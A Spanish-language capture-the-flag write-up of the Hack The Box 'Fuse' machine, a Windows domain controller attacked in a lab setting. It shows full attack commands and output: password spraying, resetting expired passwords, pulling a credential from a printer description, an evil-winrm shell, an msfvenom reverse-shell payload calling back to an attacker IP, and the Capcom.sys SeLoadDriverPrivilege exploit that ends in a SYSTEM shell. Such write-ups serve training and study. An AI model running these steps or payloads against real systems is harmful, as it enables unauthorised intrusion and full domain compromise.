+++
author = "Andrés Del Cerro"
title = "Hack The Box: Fuse Writeup | Medium"
date = "2024-07-29"
description = ""
tags = [
    "HackTheBox",
    "Fuse",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Domain User enumeration",
    "Kerbrute",
    "Password Spraying",
    "RPC Enumeration",
    "EvilWinRM",
    "Abusing SeLoadDriverPrivilege",
    "Privilege Escalation",
    "Exploit",
    "Windows"
]

+++

# Hack The Box: Fuse

Welcome to my detailed writeup of the medium difficulty machine **"Fuse"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

## 🕵️‍♂️ Initial Enumeration

# Nmap
```shell
$ rustscan -a 10.129.2.5 --ulimit 5000 -g
10.129.2.5 -> [139,135,88,80,53,464,445,389,636,593,3268,3269,5985,9389,49667,49666,49677,49678,49679,49707]
```

```shell
$ nmap -p139,135,88,80,53,464,445,389,636,593,3268,3269,5985,9389,49667,49666,49677,49678,49679,49707 -sCV 10.129.2.5 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 22:56 CEST
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.88% done; ETC: 22:58 (0:00:00 remaining)
Nmap scan report for 10.129.2.5
Host is up (0.041s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesnt have a title (text/html).
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-29 19:10:14Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49677/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc        Microsoft Windows RPC
49679/tcp open  msrpc        Microsoft Windows RPC
49707/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2024-07-29T12:11:07-07:00
| smb2-time: 
|   date: 2024-07-29T19:11:04
|_  start_date: 2024-07-29T19:07:02
|_clock-skew: mean: 33m18s, deviation: 4h02m32s, median: -1h46m43s
```

# UDP
```shell
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.2.5 -oN ../scan/allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 23:22 CEST
Nmap scan report for 10.129.2.5
Host is up (0.054s latency).
Not shown: 1497 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
```

# 🌐 Web Enumeration

Por ahora hemos descubierto el dominio `fabricorp.local` y un subdominio `fuse.fabricorp.local`

Tiene un servicio web así que vamos a echarle un vistazo

```shell
$ whatweb http://fabricorp.local
http://fabricorp.local [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.2.5], Meta-Refresh-Redirect[http://fuse.fabricorp.local/papercut/logs/html/index.htm], Microsoft-IIS[10.0]
http://fuse.fabricorp.local/papercut/logs/html/index.htm [200 OK] Country[RESERVED][ZZ], Frame, HTTPServer[Microsoft-IIS/10.0], IP[10.129.2.5], Microsoft-IIS[10.0], Title[PaperCut Print Logger : Print Logs]
```

Parece que tiene algo que ver con un servicio de impresión.
Vemos tres archivos.
- papercut-print-log-xxxx-xx-xx.csv

De los cuales conseguimos usuarios.
- pmerton
- tlavel
- sthompson
- bhult

También un nombre de impresora `HP-MFT01`

Y también nombres de ficheros interesantes
- backup_tapes
- Fabricorp01.docx

Con `kerbrute` podemos validar estos usuarios
```shell
2024/07/29 23:11:13 >  [+] VALID USERNAME:	 tlavel@fabricorp.local
2024/07/29 23:11:13 >  [+] VALID USERNAME:	 bhult@fabricorp.local
2024/07/29 23:11:13 >  [+] VALID USERNAME:	 pmerton@fabricorp.local
2024/07/29 23:11:13 >  [+] VALID USERNAME:	 sthompson@fabricorp.local
```

Después de enumerar mas, no encuentro nada, por lo cual voy a utilizar de contraseña los nombres de los documentos que se han imprimido
```shell
$ cat passwords.txt 
mega_mountain_tape_request
mega_mountain
mega_mountain_tape
Fabricorp01
fabricorp01
backup_tapes
offsite_dr_invocation
dr_invocation
printing_issue_test
```

# Password Spraying
Con `nxc` vamos a hacer password spraying, a ver si conseguimos alguna cuenta.

```shell
$ nxc smb 10.129.2.5 -u users.txt -p passwords.txt --shares
SMB         10.129.2.5      445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:mega_mountain_tape_request STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:mega_mountain_tape_request STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:mega_mountain_tape_request STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:mega_mountain_tape_request STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:mega_mountain_tape_request STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:mega_mountain STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:mega_mountain STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:mega_mountain STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:mega_mountain STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:mega_mountain STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:mega_mountain_tape STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:mega_mountain_tape STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:mega_mountain_tape STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:mega_mountain_tape STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:mega_mountain_tape STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:Fabricorp01 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:Fabricorp01 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:fabricorp01 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:fabricorp01 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:fabricorp01 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:fabricorp01 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:fabricorp01 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:backup_tapes STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:backup_tapes STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:backup_tapes STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:backup_tapes STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:backup_tapes STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:offsite_dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:offsite_dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:offsite_dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:offsite_dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:offsite_dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:dr_invocation STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\pmerton:printing_issue_test STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bnielson:printing_issue_test STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\tlavel:printing_issue_test STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\sthompson:printing_issue_test STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [-] fabricorp.local\bhult:printing_issue_test STATUS_LOGON_FAILURE
```
# Changing Users Passwords with impacket-smbpasswd
Y encontramos varios usuarios válidos que deben cambiar sus contraseñas.
- bnielson:Fabricorp01
- tlavel:Fabricorp01
- bhult:Fabricorp01

Todos estos usuarios, al intentar autenticarnos como ellos, se nos devuelve el error `NT_STATUS_PASSWORD_MUST_CHANGE`

Pero esto no es problema, porque con herramientas como `smbpasswd` podemos cambiar la contraseña del usuario, aunque sería muy ruidoso, pero estamos en un CTF...

```shell
$ impacket-smbpasswd bnielson@10.129.2.5 -newpass pointed123
Impacket v0.11.0 - Copyright 2023 Fortra

===============================================================================
  Warning: This functionality will be deprecated in the next Impacket version  
===============================================================================

Current SMB password: 
[!] Password is expired, trying to bind with a null session.
[-] Some password update rule has been violated. For example, the password may not meet length criteria.
```

Vamos a poner una password mas robusta

```shell
$ impacket-smbpasswd bnielson@10.129.2.5 -newpass Pointed123@
Impacket v0.11.0 - Copyright 2023 Fortra

===============================================================================
  Warning: This functionality will be deprecated in the next Impacket version  
===============================================================================

Current SMB password: 
[!] Password is expired, trying to bind with a null session.
[*] Password was changed successfully.
```

Vamos a probar con `nxc`
```shell
$ nxc smb 10.129.2.5 -u 'bnielson' -p 'Pointed123@'
SMB         10.129.2.5      445    FUSE             [*] Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.129.2.5      445    FUSE             [+] fabricorp.local\bnielson:Pointed123@
```

Ningún usuario de la lista está en el grupo de `Remote Management Users` por lo cual no podemos utilizar herramientas como `evil-winrm` para conseguir una shell.

# 📂 Enumerating SMB
Cuando intento enumerar el SMB se ha reestablecido la pwd, por lo cual podemos deducir que hay un script por detrás que va reestableciendo la contraseña a estos usuarios.

```shell
$ smbmap -H 10.129.2.5 -u bnielson -p 'ASsdasd23123123@'
[+] IP: 10.129.2.5:445	Name: fabricorp.local                                   
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	HP-MFT01                                          	NO ACCESS	HP-MFT01
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	print$                                            	READ ONLY	Printer Drivers
	SYSVOL                                            	READ ONLY	Logon server share
```

Lo único interesante es el recurso `print$` pero no encontramos nada de interés.

# 📂 Enumerating RPC and Gaining Foothold
Con `rpcclient` vamos a seguir enumerando usuarios, grupos y equipos.

Tenemos permisos suficientes, así que perfecto.
```shell
$ rpcclient -U bnielson%'Wachiturro123@' 10.129.2.5
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
```

Vemos un grupo interesante.
`group:[IT_Accounts] rid:[0x644]`

Pero no tiene descripción.
```shell
rpcclient $> querygroup 0x644
	Group Name:	IT_Accounts
	Description:	
	Group Attribute:7
	Num Members:2
```

Como antes hemos visto que existe un servicio de impresión, podemos enumerar las impresoras y encontramos una credencial.
```shell
rpcclient $> enumprinters
	flags:[0x800000]
	name:[\\10.129.2.5\HP-MFT01]
	description:[\\10.129.2.5\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
	comment:[]
```

con `nxc` 
```shell
v1ce$1 STATUS_LOGON_FAILURE
SMB         10.129.2.5      445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1
```

Y este usuario tiene permiso para conectarse mediante WinRM ~~(por la cara)~~
```shell
$ nxc winrm 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1' 
WINRM       10.129.2.5      5985   FUSE             [*] Windows 10 / Server 2016 Build 14393 (name:FUSE) (domain:fabricorp.local)
WINRM       10.129.2.5      5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```

## Connecting via WinRM
```shell
$ evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
fabricorp\svc-print

# Privilege Escalation 
Vemos que este usuario tiene el privilegio SeLoadDriverPrivilege, este privilegio ya lo he explotado varias veces, podemos hacer uso de un driver vulnerable especialmente diseñado para escalar privilegios y convertirnos en administradores.

```shell
*Evil-WinRM* PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Haciendo uso de este [PoC](https://github.com/JoshMorrison99/SeLoadDriverPrivilege) , podemos ahorrarnos mucho trabajo. TarLogic hizo un [post](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/) de la explotación de este caso muy interesante.

Primero, con `msfvenom`, nos creamos un payload de reverse shell para windows x64.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.71 LPORT=443 -f exe -o rev.exe`

Ahora, nos descargamos el repositorio anteriormente mencionado, debemos de subir los archivos `Capcom.sys` , `LoadDriver.exe` , `rev.exe` y `ExploitCapcom.exe`

Como tenemos una consola con `evil-winrm` podemos subir directamente los archivos ya que es una funcionalidad adicional que incluye esta herramienta.

```cmd
*Evil-WinRM* PS C:\Users\svc-print\privesc> upload rev.exe
                                        
Info: Uploading /home/pointedsec/Desktop/fuse/content/rev.exe to C:\Users\svc-print\privesc\rev.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-print\privesc> upload SeLoadDriverPrivilege/Capcom.sys
                                        
Info: Uploading /home/pointedsec/Desktop/fuse/content/SeLoadDriverPrivilege/Capcom.sys to C:\Users\svc-print\privesc\Capcom.sys
                                        
Data: 14100 bytes of 14100 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-print\privesc> upload SeLoadDriverPrivilege/LoadDriver.exe
                                        
Info: Uploading /home/pointedsec/Desktop/fuse/content/SeLoadDriverPrivilege/LoadDriver.exe to C:\Users\svc-print\privesc\LoadDriver.exe
                                        
Data: 20480 bytes of 20480 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-print\privesc> upload SeLoadDriverPrivilege/ExploitCapcom.exe 
                                        
Info: Uploading /home/pointedsec/Desktop/fuse/content/SeLoadDriverPrivilege/ExploitCapcom.exe to C:\Users\svc-print\privesc\ExploitCapcom.exe
                                        
Data: 357716 bytes of 357716 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-print\privesc> dir


    Directory: C:\Users\svc-print\privesc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/29/2024   1:27 PM          10576 Capcom.sys
-a----        7/29/2024   1:27 PM         268288 ExploitCapcom.exe
-a----        7/29/2024   1:27 PM          15360 LoadDriver.exe
-a----        7/29/2024   1:27 PM           7168 rev.exe
```

Ahora, nos ponemos con `netcat` en escucha por el puert 443.
```shell
$ sudo rlwrap -cEr nc -lvnp 443
listening on [any] 443 ...
```

Y en la máquina víctima, ejecutamos el `LoadDriver.exe` , debemos especificarle una ruta para cargar el drive en el registro, puede ser la que sea dentro de `CurrentControlSet`

```cmd
*Evil-WinRM* PS C:\Users\svc-print\privesc> .\LoadDriver.exe System\CurrentControlSet\MyService C:\Users\svc-print\privesc\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
NTSTATUS: 00000000, WinError: 0
```

Y ahora, ejecutamos el `ExploitCapcom.exe`, en la documentación dice de mover `rev.exe` a `C:\Windows\Temp\rev.exe` y ejecutar `ExploitCapcom.exe` sin parámetros, pero esto no me ha funcionado por alguna razón, **así que le especificamos la ruta de `rev.exe` como parámetro**.

```shell
*Evil-WinRM* PS C:\Users\svc-print\privesc> .\ExploitCapcom.exe C:\Users\svc-print\privesc\rev.exe
[+] Path is: C:\Users\svc-print\privesc\rev.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 000001AF5B210008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

```shell
$ sudo rlwrap -cEr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.2.5] 50550
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\svc-print\privesc>whoami
whoami
nt authority\system
```

Y ya hemos conseguido acceso como el usuario `nt authority\system` por lo cual hemos escalado privilegios y hemos terminado esta máquina.

Happy Hacking! 🚀